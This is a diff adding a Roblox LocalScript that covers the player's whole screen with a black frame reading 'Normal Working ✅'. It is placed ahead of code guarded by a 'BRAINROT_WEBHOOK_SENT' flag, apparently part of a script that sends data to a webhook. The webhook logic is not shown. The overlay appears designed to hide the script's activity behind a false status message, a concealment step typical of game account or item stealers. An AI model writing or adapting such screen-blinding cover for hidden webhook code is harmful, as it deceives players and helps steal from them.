@@ -1,3 +1,33 @@
+-- LocalScript trong StarterPlayerScripts hoặc StarterGui
+
+-- Lấy PlayerGui
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Tạo ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "FullScreenOverlay"
+screenGui.Parent = playerGui
+
+-- Tạo Frame đen phủ kín màn hình
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0) -- phủ kín màn hình
+frame.Position = UDim2.new(0, 0, 0, 0)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- màu đen
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+-- Tạo TextLabel ở giữa
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(0, 400, 0, 100) -- kích thước chữ
+textLabel.Position = UDim2.new(0.5, -200, 0.5, -50) -- căn giữa
+textLabel.BackgroundTransparency = 1
+textLabel.Text = "Normal Working ✅"
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- màu trắng
+textLabel.Font = Enum.Font.SourceSansBold
+textLabel.TextScaled = true -- chữ tự động scale
+textLabel.Parent = frame
+
 if shared.__BRAINROT_WEBHOOK_SENT then return end
 shared.__BRAINROT_WEBHOOK_SENT = true
 -- ================== SETUP ==================
